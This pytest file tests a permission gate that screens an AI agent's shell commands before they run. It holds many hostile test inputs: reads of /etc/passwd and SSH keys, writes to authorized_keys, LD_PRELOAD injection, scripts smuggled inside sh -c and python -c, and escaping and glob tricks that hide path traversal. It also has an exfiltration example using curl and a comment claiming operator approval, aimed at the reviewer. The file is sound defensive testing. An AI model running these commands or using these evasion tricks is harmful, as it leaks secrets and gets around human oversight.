"""The deterministic stage: what it reads off a command, and what it refuses to vouch for.

Two halves, tested apart because they fail apart. The **extraction** says what a command's
syntax names; the **judge** checks that against the reach the call declared and the fence
this host can build. A bug in the first is a command described as less than it is — a
failure the second cannot catch — so most of what is pinned here is the extraction refusing
to describe, rather than the judge refusing to approve.

Every "not approved" below is an *escalation*, never a refusal: the call goes to the model
reviewer. That is what makes the structural stage affordable to keep strict, and it is why
the tests are written as "this does not pass the cheap stage" rather than "this is
forbidden".

The helpers default to a host that *can* fence, because that is the interesting
configuration — the fact is an argument precisely so a test does not depend on the machine
it runs on, and the case where it is missing is pinned explicitly.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from services.home.paths import SCRATCH, Place
from services.permissions.capability import (
    ActionKind,
    capability_of,
    measured_against_root,
    shell_capability,
)
from services.permissions.fence import HomeFence
from services.permissions.judge import Judgement, judge
from services.permissions.shell_ast import command_prefixes, strip_comments

ROOT = Path("/tmp/hephaestus-judge-workspace")
API = Place("projects", "api")
SCRATCH_ONLY = HomeFence(places=frozenset({SCRATCH}), writable=frozenset({SCRATCH}))


def judged(
    command: str,
    *,
    root: Path | None = ROOT,
    fenced: bool = True,
    tool: str = "shell_run_command",
) -> Judgement:
    return judge(shell_capability(tool, command, root=root), fenced=fenced)


def cleared(
    command: str, *, root: Path | None = ROOT, fenced: bool = True, tool: str = "shell_run_command"
) -> bool:
    return judged(command, root=root, fenced=fenced, tool=tool).approved


def reason(
    command: str, *, root: Path | None = ROOT, fenced: bool = True, tool: str = "shell_run_command"
) -> str:
    return judged(command, root=root, fenced=fenced, tool=tool).reason


class TestWhatTheWalkReads:
    """The extraction, on its own — before any policy is applied to it."""

    def test_a_pipeline_is_every_command_in_it(self):
        capability = shell_capability("shell_run_command", "git diff | head -20", root=ROOT)
        assert capability.programs == ("git", "head")
        assert capability.commands[0].arguments == ("diff",)
        assert capability.commands[1].arguments == ("-20",)
        assert capability.bounded

    def test_a_redirect_is_a_write_even_when_it_reads(self):
        # `< file` only reads, and is still recorded as a write. Calling a read a write
        # can only escalate; the reverse mistake cannot be made safe afterwards.
        assert shell_capability("shell_run_command", "ls > out.txt", root=ROOT).writes == (
            "out.txt",
        )
        assert shell_capability("shell_run_command", "wc -l < in.txt", root=ROOT).writes == (
            "in.txt",
        )

    def test_an_assignment_is_recorded_against_the_command_it_prefixes(self):
        capability = shell_capability("shell_run_command", "LD_PRELOAD=x ls", root=ROOT)
        assert capability.env_writes == ("LD_PRELOAD",)
        assert capability.programs == ("ls",)

    def test_only_arguments_that_could_leave_the_directory_count_as_paths(self):
        # A bare word is at worst a file beside the ones already there. Recording every
        # one as a read would bury the arguments that matter under a page of patterns.
        capability = shell_capability("shell_run_command", "grep -rn needle src", root=ROOT)
        assert capability.reads == ()
        assert shell_capability("shell_run_command", "cat src/a.py", root=ROOT).reads == (
            "src/a.py",
        )

    def test_a_url_is_read_as_network_reach_and_not_as_a_path(self):
        capability = shell_capability("shell_run_command", "curl https://example.com", root=ROOT)
        assert capability.network
        assert capability.reads == ()

    def test_a_quoted_literal_is_a_literal_and_an_interpolated_one_is_not(self):
        assert shell_capability("shell_run_command", 'cat "a.txt"', root=ROOT).bounded
        assert not shell_capability("shell_run_command", 'cat "$HOME/a.txt"', root=ROOT).bounded

    @pytest.mark.parametrize(
        "command",
        [
            "grep --file=/etc/passwd foo",  # a long flag's value, after its `=`
            "grep -f/etc/passwd foo",  # a short flag's value, glued to the letter
            "grep -f /etc/passwd foo",  # ...and standing on its own, as an operand
        ],
    )
    def test_a_path_attached_to_a_flag_is_still_a_path(self, command: str):
        # The reading a flag hides behind. A walk that skipped every word starting with
        # `-` saw `--output=/Users/me/.ssh/authorized_keys` as no path at all.
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert capability.escapes == ("/etc/passwd",)

    def test_a_flag_that_carries_no_path_still_names_none(self):
        # The other half: `-rn`, `-20` and `--oneline` must not become paths, or every
        # ordinary read would escalate on its own flags.
        for command in ("grep -rn needle src", "git log --oneline -20", "ls -la"):
            assert shell_capability("shell_run_command", command, root=ROOT).reads == ()


class TestUnknownShapesEscalate:
    """The rule the whole design rests on: what was not read is never treated as absent."""

    @pytest.mark.parametrize(
        "command",
        [
            "if true; then ls; fi",  # a conditional
            "for f in *; do cat $f; done",  # a loop
            "(cd /tmp && ls)",  # a subshell
            "ls() { rm -rf /; }",  # a function definition
            "cat <<'EOF'\nx\nEOF",  # a heredoc
        ],
    )
    def test_a_construct_with_no_rule_is_recorded_rather_than_skipped(self, command: str):
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert not capability.bounded
        assert not cleared(command)

    @pytest.mark.parametrize(
        "command",
        [
            "echo $HOME",
            "ls ${DIR}",
            "ls $(cat targets)",
            "cat <(ls)",
            "echo $((1 + 1))",
        ],
    )
    def test_a_value_decided_at_run_time_is_never_interpolated_away(self, command: str):
        # The single most tempting shortcut — "it is probably a path in the workspace" —
        # and the one that turns the containment check into decoration.
        assert not shell_capability("shell_run_command", command, root=ROOT).bounded
        assert not cleared(command)

    def test_a_program_name_assembled_at_run_time_is_not_a_command(self):
        capability = shell_capability("shell_run_command", "$TOOL --version", root=ROOT)
        assert capability.programs == ()
        assert not capability.bounded

    def test_a_command_that_does_not_parse_is_read_as_unparsed(self):
        # tree-sitter recovers rather than raising, so a broken command comes back as a
        # tree with error nodes — which must be seen, not walked past.
        assert not shell_capability("shell_run_command", "ls |", root=ROOT).bounded


class TestAWordTheShellWouldRewrite:
    """The gap between the command as *written* and the command as *run*.

    Every one of these reads `/etc/passwd` under `/bin/sh` — the shell the tools spawn —
    while naming, on the command line, a path with no `..` in it for a containment check
    to find. They were all cleared as workspace reads before the walk stopped treating a
    word the shell would rewrite as a value.
    """

    @pytest.mark.parametrize(
        "command",
        [
            r"cat .\./etc/passwd",  # backslash before a dot, removed by the shell
            r"cat \/etc/passwd",  # backslash before the leading slash
            "cat {..,}/etc/passwd",  # brace expansion
            "cat .[.]/.[.]/etc/passwd",  # a bracket class matching one literal character
        ],
    )
    def test_a_word_the_shell_rewrites_is_not_a_path_this_file_has_read(self, command: str):
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert not capability.bounded
        assert not cleared(command)
        assert reason(command) == "a word the shell would expand or unescape"

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "cat src/main.py",
            "grep -rn needle src",
            "git status",
            "git ls-files | head -20",
            "cat ./notes/today.md",
            "wc -l src/main.py",
            "find . -name '*.py'",  # quoted: single quotes suppress every expansion
        ],
    )
    def test_a_plainly_spelled_command_is_untouched(self, command: str):
        assert shell_capability("shell_run_command", command, root=ROOT).bounded
        assert cleared(command)

    def test_a_value_glued_to_a_flag_is_still_read(self):
        # `--flag=path` is one word and an ordinary one: nothing in it expands.
        capability = shell_capability("shell_run_command", "grep --file=src/p.txt x .", root=ROOT)
        assert capability.bounded
        assert "src/p.txt" in capability.reads

    def test_a_redirect_this_file_cannot_read_is_not_a_redirect_to_nowhere(self):
        # The destination is read off the grammar's own field. Scanning the children for
        # whichever one happened to be literal recorded `> {a,b}` as writing nothing.
        for command in ("ls > {a,b}", "ls > $OUT"):
            capability = shell_capability("shell_run_command", command, root=ROOT)
            assert capability.writes == ()
            assert not capability.bounded
            assert not cleared(command)


class TestAWordThatIsAWholeCommandLine:
    """The sequel to the four commands above, and the same failure by a different door.

    Those hid a path from the containment check by spelling it so the *shell* would rewrite
    it. These hide it by handing it to another program: `sh -c 'cat /etc/passwd'` is one
    word to the shell, and measuring that word as a relative path places
    `<root>/cat /etc/passwd` comfortably inside the worktree — so the command cleared at
    tier `workspace` with no review and no prompt, while `cat /etc/passwd` on its own
    escalates. The fence cannot be the backstop for it either, since reads are the one half
    of a declaration it does not hold.

    Telling `sh -c` from `git commit -m` by *program* needs to know what the program does
    with the string, which is the program table this whole design exists without. Telling
    them apart by what the words *name* needs no table: a quoted argument is measured word
    by word, so the script is refused for the path it carries and the commit message,
    carrying none, clears. An argument carrying the syntax a program would run is not
    placed at all.
    """

    @pytest.mark.parametrize(
        ("command", "escape"),
        [
            ("sh -c 'cat /etc/passwd'", "/etc/passwd"),
            ("eval 'cat /etc/passwd'", "/etc/passwd"),
            ("bash -c 'cat ../outside.txt'", "../outside.txt"),
            ("sh -c 'cat ~/.ssh/id_rsa'", "~/.ssh/id_rsa"),
            ("perl -e 'open F, \"/etc/passwd\"'", "/etc/passwd"),  # glued to a quote
        ],
    )
    def test_a_path_inside_a_quoted_script_is_the_path_it_is(self, command: str, escape: str):
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert capability.bounded  # every word was read; one of them left the worktree
        assert escape in capability.escapes
        assert not cleared(command)
        assert "outside the workspace" in reason(command)

    @pytest.mark.parametrize(
        "command",
        [
            "bash -c 'cat /etc/passwd > leak.txt'",
            "python3 -c 'print(open(\"/etc/passwd\").read())'",
            "python3 -c\"print(open('/etc/passwd').read())\"",  # glued to the flag, no space
            "awk 'BEGIN{while((getline l < \"/etc/passwd\")>0) print l}'",
            "sh -c 'cat${IFS}/etc/passwd'",
            "sh -c 'ls; cat /etc/passwd'",
        ],
    )
    def test_a_script_carrying_syntax_is_not_placed_at_all(self, command: str):
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert not capability.bounded
        assert not cleared(command)
        assert reason(command) == (
            "an argument carrying shell syntax that a program could run as a command line"
        )

    @pytest.mark.parametrize(
        "command",
        [
            r"sh -c 'cat \/etc/passwd'",  # the inner shell removes the backslash
            "sh -c 'cat {..,}/etc/passwd'",  # and expands the brace
        ],
    )
    def test_a_word_the_inner_shell_would_rewrite_is_refused_one_shell_deeper(self, command: str):
        assert not cleared(command)
        assert reason(command) == "a word the shell would expand or unescape"

    @pytest.mark.parametrize(
        "command",
        [
            "git commit -m 'fixed the parser'",
            "git commit -m 'see docs/notes.md for the shape'",
            "pytest -k 'not slow'",
            "echo 'hello world' >> notes.md",
            "sh -c 'rm -rf .'",  # contained, and fenced to the worktree when it runs
        ],
    )
    def test_a_quoted_argument_whose_words_stay_inside_clears(self, command: str):
        # The breadth this rule buys: a commit message is the most common quoted argument
        # a code thread writes, and it pays no review for having spaces in it.
        assert shell_capability("shell_run_command", command, root=ROOT).bounded
        assert cleared(command)

    @pytest.mark.parametrize(
        "command",
        [
            "find . -name '*.py'",  # a glob handed to `find` cannot leave the directory
            "grep -rn needle src",
            "sed -i s/a/b/ f.txt",
            "git commit -m wip",
            "uv run pytest tests/test_a.py",
        ],
    )
    def test_a_single_word_argument_is_still_read_as_one(self, command: str):
        # The rule is about words, not about quoting: everything here is one word per
        # argument, and none of it pays for the case above.
        assert shell_capability("shell_run_command", command, root=ROOT).bounded
        assert cleared(command)

    def test_the_scope_of_a_quoted_message_ends_before_the_message(self):
        # A message is the target of a commit, and a scope names the act and not its
        # target: one yes to `git commit -m 'fixed the parser'` stands for a commit with
        # any message, which is the act the operator ticked the box under.
        assert command_prefixes("git commit -m 'fixed the parser'") == (("git", "commit", "-m"),)


class TestAPatternIsPlacedByItsDirectory:
    """A glob expands inside the directory its fixed part names, and nowhere else."""

    @pytest.mark.parametrize(
        ("command", "read"),
        [
            ("cat *.py", None),
            ("ls src/*.log", "src/"),
            ("rm -rf build/*", "build/"),
            ("cat src/**/*.py", "src/"),
            ("cat x.*", None),  # the dot is not leading, so this cannot match `..`
        ],
    )
    def test_a_pattern_inside_the_worktree_clears(self, command: str, read: str | None):
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert capability.bounded
        assert cleared(command)
        if read is not None:
            assert read in capability.reads

    @pytest.mark.parametrize("command", ["cat /etc/*", "cat ../*", "ls ~/*.txt"])
    def test_a_pattern_whose_directory_is_outside_escalates(self, command: str):
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert capability.bounded
        assert capability.escapes
        assert not cleared(command)

    @pytest.mark.parametrize("command", ["cat .*/x", "ls .?/x", "cat ./.*"])
    def test_a_segment_that_could_match_the_parent_is_not_read(self, command: str):
        # `/bin/sh` matches `.?` and `.*` against `..`, and a pattern that can climb one
        # level can climb every level above it.
        assert not cleared(command)
        assert reason(command) == "a pattern that could match the parent directory"


class TestTheWordsACommandLeadsWith:
    """`command_prefixes` — what a standing permission could be scoped to without being
    scoped to one invocation."""

    @pytest.mark.parametrize(
        ("command", "prefixes"),
        [
            ("uv run pytest tests/test_a.py -k thing", (("uv", "run", "pytest"),)),
            ("brew install ripgrep", (("brew", "install", "ripgrep"),)),
            ("git commit -m 'x'", (("git", "commit", "-m", "x"),)),
            ("ls", (("ls",),)),
        ],
    )
    def test_the_program_and_the_words_that_say_which_of_its_modes(
        self, command: str, prefixes: tuple[tuple[str, ...], ...]
    ):
        assert command_prefixes(command) == prefixes

    @pytest.mark.parametrize(
        ("command", "prefixes"),
        [
            ("curl -sS https://api.example/x", (("curl", "-sS", "https://api.example/x"),)),
            ("env -i true", (("env", "-i", "true"),)),
            ("git --version", (("git", "--version"),)),
            ("npm -w pkg run build", (("npm", "-w", "pkg", "run"),)),
        ],
    )
    def test_a_flag_narrows_the_prefix_instead_of_ending_it(
        self, command: str, prefixes: tuple[tuple[str, ...], ...]
    ):
        # Stopping at the first `-` read every flag-led command as its bare program name,
        # and since a later command is read by this same walk, one yes to `curl -sS <url>`
        # then stood for `curl -d @.env <elsewhere>` too. A flag is part of the act, so it
        # is kept — and it costs the cap nothing, because what the cap withholds is the
        # target, and a target is an operand.
        assert command_prefixes(command) == prefixes

    def test_the_cap_counts_operands_and_stops_the_reading(self):
        # Three operands in, nothing more is read — not the flags either. That is what
        # keeps `uv run pytest` a standing yes to the *act* rather than to one invocation.
        assert command_prefixes("uv run pytest -k thing tests/a.py") == (("uv", "run", "pytest"),)

    @pytest.mark.parametrize(
        ("command", "prefixes"),
        [
            ("git diff | head -20", (("git", "diff"), ("head", "-20"))),
            (
                "git add . && git commit -m x",
                (("git", "add", "."), ("git", "commit", "-m", "x")),
            ),
        ],
    )
    def test_every_stage_answers_for_itself(
        self, command: str, prefixes: tuple[tuple[str, ...], ...]
    ):
        # A pipeline is not one act: reading only its head would name the harmless half
        # and leave whatever it feeds unscoped.
        assert command_prefixes(command) == prefixes

    @pytest.mark.parametrize("command", ["cat $TARGET", "ls |", "$TOOL --version", ""])
    def test_a_command_that_could_not_be_read_has_no_prefix(self, command: str):
        # The word that names the act may be the one that could not be read, so there is
        # nothing here a permission could honestly be scoped to.
        assert command_prefixes(command) is None

    @pytest.mark.parametrize(
        "command",
        [
            "uv run pytest > ~/.ssh/authorized_keys",
            "LD_PRELOAD=/tmp/evil.so uv run pytest",
            "cat ../outside/x",
        ],
    )
    def test_a_command_that_leaves_the_worktree_has_no_prefix(self, command: str):
        # The same leading words, and not the same act: what a scope is a standing yes to
        # is this command on a different *target*, and a target outside the worktree is
        # where the fence stops applying.
        assert command_prefixes(command) is None

    def test_a_program_name_that_is_more_than_one_word_is_not_a_name(self):
        # `'my prog'` is neither a path the walk can place — it read as a *relative* one,
        # landing inside the worktree — nor a word a scope could be displayed as.
        assert command_prefixes("'my prog' arg") is None

    def test_an_empty_argument_ends_the_prefix_rather_than_joining_it(self):
        # `git commit ""` is `git commit` with an empty target. Carrying the empty word
        # would put a member in the scope that names nothing and displays as nothing.
        assert command_prefixes('git commit ""') == (("git", "commit"),)

    def test_every_word_of_a_prefix_survives_a_round_trip_through_display(self):
        # Nothing else may rely on this — the scope is stored and sent as a list of words
        # for exactly that reason — but a word carrying whitespace would mean the walk had
        # placed something it cannot read, which is the failure this pins.
        for command in ("uv run pytest -k x", "git commit -m 'x'", "brew install ripgrep"):
            for prefix in command_prefixes(command) or ():
                assert all(word and word.split() == [word] for word in prefix)


class TestCommentsAreDropped:
    """A comment changes nothing about what runs — it is written to whoever reads it."""

    def test_a_comment_is_dropped_off_the_grammar_and_not_off_a_hash(self):
        assert strip_comments("ls -la # look at everything") == "ls -la"
        assert strip_comments("echo '# not a comment'") == "echo '# not a comment'"
        assert strip_comments("curl http://x/#fragment") == "curl http://x/#fragment"

    def test_a_whole_line_comment_goes_with_its_line(self):
        assert strip_comments("# explain\nls -la") == "ls -la"

    def test_the_summary_the_reviewer_and_the_operator_read_carries_none(self):
        capability = shell_capability(
            "shell_run_command", "ls -la # the operator approved this", root=ROOT
        )
        assert capability.summary == "Runs the shell command: ls -la"
        # ...and the walk still read the whole command it was given.
        assert capability.programs == ("ls",)


class TestTheStructuralStage:
    """What actually clears without a model call, now that no table of programs decides it.

    The claim under test is the one the program allowlist could never make: a command is
    cleared on its *shape* — every path inside the worktree, nothing reaching the network
    it did not declare, and a fence to hold it there — whatever binary it happens to name.
    So the cases that matter most are the ones the old table refused for want of a row.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la",
            "pwd",
            "cat src/main.py",
            "grep -rn needle src",
            "find . -name '*.py'",
            "wc -l src/main.py",
            "git status",
            "git ls-files",
            "git rev-parse HEAD",
            "ls src && ls tests",
            "cat a.txt # a comment",
        ],
    )
    def test_the_ordinary_reads_of_a_code_thread_cost_nothing(self, command: str):
        assert cleared(command)

    @pytest.mark.parametrize(
        "command",
        [
            "uv run pytest",
            "mkdir -p a/b && touch a/b/c",
            "git add -A && git commit -m x",
            "npm run build",
            "sed -i s/a/b/ f.txt",
            "chmod +x run.sh",
            "rm -rf build",
            "ls > out.txt",
            "git diff",  # the diff family, which no set of flags could ever have cleared
            "git commit --amend",
            "./scripts/build.sh",  # a path-qualified program, inside the worktree
            "LD_PRELOAD=x ls",  # an assignment whose value is not a path at all
        ],
    )
    def test_the_ordinary_work_of_a_code_thread_costs_nothing_either(self, command: str):
        # Every one of these went to a model reviewer under the program allowlist — most of
        # them because no row could state their rule, and the reviewer's own rubric then
        # scored "runs a program" high enough to park. Structure clears them because the
        # fence, not a claim about the binary, is what bounds them.
        assert cleared(command)
        assert judged(command).tier == "workspace"

    def test_an_environment_assignment_is_no_longer_a_refusal(self):
        # `LD_PRELOAD=… ls` is a different program from `ls`, and the fence does not care:
        # whatever it loads is held to the same paths and the same egress as the command
        # that loaded it. Enumerating the variables that change what a program does was
        # always a losing game; this is what stopped it having to be won.
        assert cleared("LD_PRELOAD=x ls")
        assert not cleared("LD_PRELOAD=x ls", fenced=False)

    @pytest.mark.parametrize(
        "command",
        [
            "LD_PRELOAD=/tmp/evil.so ls",
            "GIT_DIR=/etc git status",
            "GIT_DIR=../../other/.git git log",
            "PATH=/tmp/evil ls",
            "FOO=~/secrets ls",
            "env LD_PRELOAD=/tmp/x.so ls",  # the same thing spelled as an argument
        ],
    )
    def test_an_assignments_value_is_a_path_like_any_other(self, command: str):
        # The variable *name* was never the interesting half. Recording only it left the
        # escaping path out of the structural facts entirely — so not merely unchecked, but
        # invisible to the reviewer an escalation would have gone to. `env`-prefixed spells
        # it as an argument instead, where `LD_PRELOAD=/tmp/x.so` read as one relative path
        # lands comfortably inside the worktree unless the reading looks past the `=`.
        capability = shell_capability("shell_run_command", command, root=ROOT)
        assert capability.escapes, command
        assert not cleared(command)
        assert "outside the workspace" in reason(command)

    @pytest.mark.parametrize(
        "command", ["~/evil.sh", "../outside/evil.sh", "/bin/ls", "/etc/../bin/ls"]
    )
    def test_the_program_is_measured_like_every_other_path(self, command: str):
        # Running a file is reading it, and reads are the half no fence bounds — so a
        # program named by path is exactly the containment question `cat` asks, one word
        # to the left. Every one of these cleared at tier `workspace` while the identical
        # path written as an operand was refused.
        assert shell_capability("shell_run_command", command, root=ROOT).escapes == (command,)
        assert not cleared(command)
        assert "outside the workspace" in reason(command)

    def test_a_bare_program_name_is_not_a_path_and_is_not_measured(self):
        # The other half, and the reason this is not simply "refuse anything with a
        # program in it": `ls` resolves through `PATH`, which is not a path the command
        # named — while `./scripts/build.sh` is one, and is inside the worktree.
        for command in ("ls -la", "git status", "./scripts/build.sh"):
            assert cleared(command), command

    @pytest.mark.parametrize(
        ("command", "fragment"),
        [
            ("cat ../secrets", "outside the workspace"),
            ("cd ..", "outside the workspace"),
            ("cat $TARGET", "not known here"),
            ("ls |", "could not parse"),
        ],
    )
    def test_each_refusal_names_the_fact_that_was_missing(self, command: str, fragment: str):
        # The reason is what an operator reads on the review row when a benign-looking
        # command escalates; "the system was arbitrary" is the reading it exists to prevent.
        assert not cleared(command)
        assert fragment in reason(command)

    def test_a_change_of_directory_is_still_measured(self):
        # `cd ..` names a path like any other operand, and the walk reads it as one — which
        # is what keeps a `cd` out of the worktree from being the one act that clears
        # because nobody thought of it as a path.
        assert cleared("cd src")
        assert not cleared("cd ..")

    def test_the_host_tool_is_never_cleared_here(self):
        for fenced in (True, False):
            judgement = judged("ls", tool="shell_run_on_host", fenced=fenced)
            assert not judgement.approved and judgement.tier is None

    def test_a_networked_command_is_always_the_reviewers(self):
        # The VM bounds writes and egress and cannot bound *reads* of the mounted project,
        # so a command that reaches out is the only way any of it leaves. An allowed-domains
        # list does not settle that: the seeded hosts take uploads as readily as they serve
        # downloads. So it escalates whatever the operator has allowed.
        judgement = judged("curl https://example.com")
        assert not judgement.approved
        assert judgement.reason == "names a network address; the reviewer decides"
        assert judgement.tier is None

    def test_an_install_or_clone_is_the_reviewers(self):
        # The VM runs it with its egress, so the judge reads it as a networked command
        # rather than clearing it as contained work.
        for command in ("pip install requests", "npm ci", "git clone repo"):
            judgement = judged(command)
            assert not judgement.approved, command
            assert judgement.reason == "installs or clones; the reviewer decides"

    def test_without_a_fence_nothing_structural_clears(self):
        # With no VM to hold a process, the model reviewer rules instead — with the same
        # structural facts in front of it.
        for command in ("ls -la", "uv run pytest", "git status"):
            assert not cleared(command, fenced=False)
        assert "can reach the network" in reason("ls -la", fenced=False)

    def test_a_read_clears_with_no_fence_but_a_sandbox_call_does_not(self):
        # A read is settled by the tool's class. A sandboxed program is held by a VM with no
        # network, so without that fence it is the reviewer's.
        read = judge(capability_of("corpus_retrieve", {"query": "x"}), fenced=False)
        assert read.approved and read.tier == "read"
        program = capability_of("code_execute", {"code": "print(1)"}, root=SCRATCH_ONLY)
        assert program.sandboxed
        unfenced = judge(program, fenced=False)
        assert not unfenced.approved and unfenced.tier is None

    def test_a_sandbox_call_has_no_way_to_ask_for_the_network(self):
        # The container *is* the fence for this tool, and it is unconditional: there is no
        # per-call switch left to flip, so the tier can clear the call without reading the
        # program. Widening what the workspace may reach is a different act with a tool of
        # its own (`code_request_egress`), which never clears here — see
        # `test_widening_the_egress_allowlist_is_never_cleared_here`.
        offline = judge(
            capability_of("code_execute", {"code": "print(1)"}, root=SCRATCH_ONLY), fenced=True
        )
        assert offline.approved
        assert offline.tier == "sandbox"
        # ...and asking for one by writing the argument the tool no longer has changes
        # nothing, since nothing reads it.
        asked = judge(
            capability_of("code_execute", {"code": "print(1)", "network": True}, root=SCRATCH_ONLY),
            fenced=True,
        )
        assert asked.approved and asked.tier == "sandbox"

    def test_the_host_tool_is_the_only_command_tool_off_the_vm(self):
        assert capability_of("shell_run_on_host", {"command": "ls"}).on_host
        assert not capability_of("shell_run_command", {"command": "ls"}).on_host
        assert not capability_of("shell_start_command", {"command": "ls"}).on_host

    def test_a_sandbox_program_is_cleared_by_its_container(self):
        # The call is cleared on the *container*, which bounds it whatever the program does.
        capability = capability_of("code_execute", {"code": "print(1)"}, root=SCRATCH_ONLY)
        assert capability.sandboxed
        judgement = judge(capability, fenced=True)
        assert judgement.approved
        assert judgement.tier == "sandbox"

    def test_a_program_is_not_sandboxed_where_a_project_is_writable(self):
        writable = HomeFence(places=frozenset({SCRATCH, API}), writable=frozenset({SCRATCH, API}))
        capability = capability_of("code_execute", {"code": "print(1)"}, root=writable)
        assert not capability.sandboxed
        assert not judge(capability, fenced=True).approved
        assert not capability_of("code_execute", {"code": "print(1)"}, root=ROOT).sandboxed


class TestContainment:
    """Where a path may land, measured against the run's workspace."""

    @pytest.mark.parametrize(
        "command",
        [
            "cat ../../../etc/passwd",
            "cat /etc/passwd",
            "cat ~/.ssh/id_rsa",
            "ls ~",
        ],
    )
    def test_a_read_that_leaves_the_workspace_escalates(self, command: str):
        assert not cleared(command)

    def test_home_is_refused_rather_than_resolved(self):
        # `~` is the operator's own directory by definition, so a command naming it is
        # reaching past the workspace whatever the rest of the path says — and resolving
        # it would only ask about a directory this process may not even share.
        capability = shell_capability("shell_run_command", "cat ~/notes.md", root=ROOT)
        assert capability.escapes == ("~/notes.md",)

    def test_with_no_workspace_nothing_clears_at_all(self):
        # There is nothing to measure against, and "we could not tell" has to read the
        # same as "it left" — including for the path that names no directory. `cat .env`
        # neither escapes nor writes, so a stage reading only those fields would clear a
        # command whose working directory this process never established; it is recorded
        # as unread instead, and unread never passes.
        assert not cleared("cat /etc/passwd", root=None)
        assert not cleared("cat ../outside.txt", root=None)
        assert not cleared("cat notes.md", root=None)
        assert "no workspace directory" in reason("cat .env", root=None)


class TestAHostCommandIsNotAWorkspaceCommand:
    """`shell_run_on_host` runs on the operator's machine, not in the workspace."""

    def test_it_is_never_cleared_by_the_deterministic_stage(self):
        # Reading it against the run's workspace root was how `cat .env` cleared as a
        # workspace read while the command ran somewhere else entirely. There is no root
        # it *could* be read against: in the modes this tool exists in, the workspace is a
        # container the host cannot see.
        for command in ("cat .env", "ls", "git status"):
            capability = capability_of(
                "shell_run_on_host", {"command": command, "explanation": "x"}, root=ROOT
            )
            judgement = judge(capability, fenced=True)
            assert not judgement.approved, command
            assert "runs on the host" in judgement.reason

    def test_the_same_command_in_the_workspace_still_clears(self):
        # The contrast is the point: what changed is where the command runs, not how
        # generous the stage is about reading a workspace.
        assert cleared("git status")

    def test_the_gate_opens_no_workspace_to_judge_one(self):
        # Opening a workspace is a `git worktree add` or a container start, and a host
        # command would be measured against it wrongly anyway.
        assert not measured_against_root("shell_run_on_host")
        assert measured_against_root("shell_run_command")
        assert measured_against_root("files_write_file")


class TestAClassifiedReadClears:
    """The second thing this stage can approve: a tool the catalog classifies as a read.

    A read is settled by the *tool*, not by its arguments — it returns something and
    leaves nothing different behind whatever it is asked for — so there is no reviewer
    question left. What has to hold is that nothing else can wear the same clothes.
    """

    def test_a_recall_never_reaches_a_model(self):
        # The two relevance-ranked recalls, both pure observation. Before this, every
        # recall at Auto cost a reviewer round-trip — and parked the run outright when no
        # utility model was bound.
        for tool, args in (
            ("memory_recall", {"query": "what did we decide about billing"}),
            ("corpus_retrieve", {"query": "invoice", "collection": "docs"}),
        ):
            capability = capability_of(tool, args, root=ROOT)
            assert capability.kind is ActionKind.READ
            assert judge(capability, fenced=False).approved, tool

    def test_the_row_names_the_ground_it_was_cleared_on(self):
        # Three approvals, not one kind of approval: this one is the tool's class alone,
        # with nothing weighing the arguments and no model consulted. The row says so in
        # those words rather than reading like a review that happened to pass, and the
        # tier is the machine-readable half of the same fact.
        judgement = judge(
            capability_of("corpus_retrieve", {"query": "invoice"}, root=ROOT), fenced=True
        )
        assert judgement.approved
        assert judgement.tier == "read"
        assert judgement.reason == "classified read, cleared at Auto with no review"
        # A command cleared structurally is a different answer and says so in its tier —
        # which is what the tool that executes it reads to pick the fence to run it under.
        assert judged("git status").tier == "workspace"

    def test_a_read_is_named_by_its_keys_and_never_its_values(self):
        # The summary rides onto the work log and into the reviewer's prompt, and a recall
        # query is the operator's own words.
        capability = capability_of("memory_recall", {"query": "my passport number"}, root=ROOT)
        assert "passport" not in capability.summary
        assert "query" in capability.summary

    def test_a_tool_this_installation_does_not_ship_is_not_a_read(self):
        # The class registry is a closed literal; an unknown name resolves to the class
        # that reaches furthest, so an operator's own MCP server cannot name its way in.
        for tool in ("external_notion_search", "some_future_tool"):
            assert capability_of(tool, {"query": "x"}, root=ROOT).kind is not ActionKind.READ

    def test_the_read_kind_tracks_the_sensitivity_registry(self):
        # The kind is not a second list to keep in step with `tool_sensitivity` — it *is*
        # that list, read at call time. A tool reclassified there changes here.
        from services.tool_sensitivity import SENSITIVITY_CLASSES, Sensitivity

        for tool in SENSITIVITY_CLASSES[Sensitivity.WORKSPACE_WRITE]:
            assert capability_of(tool, {}, root=ROOT).kind is not ActionKind.READ, tool
        assert capability_of("web_search", {"query": "x"}, root=ROOT).kind is ActionKind.READ


class TestTheOtherKindsOfAction:
    """Everything that is neither a shell command nor a read, and why none of it clears."""

    def test_an_act_that_changes_something_is_never_cleared_here(self):
        for tool, args in (
            ("mail_send", {"to": "a@b.c", "subject": "hi"}),
            ("vault_get_entry", {"name": "bank"}),
            ("external_notion_create_page", {"title": "x"}),
            ("files_write_file", {"path": "a.txt", "content": "x"}),
        ):
            assert not judge(capability_of(tool, args, root=ROOT), fenced=True).approved

    def test_an_interpreter_program_is_not_bounded_by_its_arguments(self):
        capability = capability_of("code_execute", {"code": "print(1)"}, root=ROOT)
        assert capability.kind is ActionKind.OPAQUE
        assert not capability.bounded

    def test_widening_the_egress_allowlist_is_never_cleared_here(self):
        # `code_request_egress` carries no command and no path, so it falls through to the
        # opaque description on purpose: its effect is a standing widening of what the
        # workspace may reach, which no grammar walk can bound and no cheap stage may
        # vouch for. Every one of these has to reach the operator.
        capability = capability_of(
            "code_request_egress", {"domains": ["evil.example.com"], "reason": "x"}, root=ROOT
        )
        assert capability.kind is ActionKind.OPAQUE
        assert not capability.bounded
        assert not judge(capability, fenced=True).approved
        # And the host is named in the summary, because that summary is the whole of what
        # the Auto reviewer is handed: a card reading "calls this tool with arguments
        # domains, reason" clears the fence's one exit without anyone seeing the host.
        assert "evil.example.com" in capability.summary

    def test_a_tool_whose_effect_is_its_own_is_never_called_fully_read(self):
        # `bounded` promises that the fields beside it describe the *whole* act. For a
        # tool whose effect is not written in its arguments they describe none of it, so
        # an empty `unbounded` there would be the extraction claiming a completeness it
        # has no basis for — the one mistake this module exists to avoid.
        capability = capability_of("mail_send", {"to": "a@b.c"}, root=ROOT)
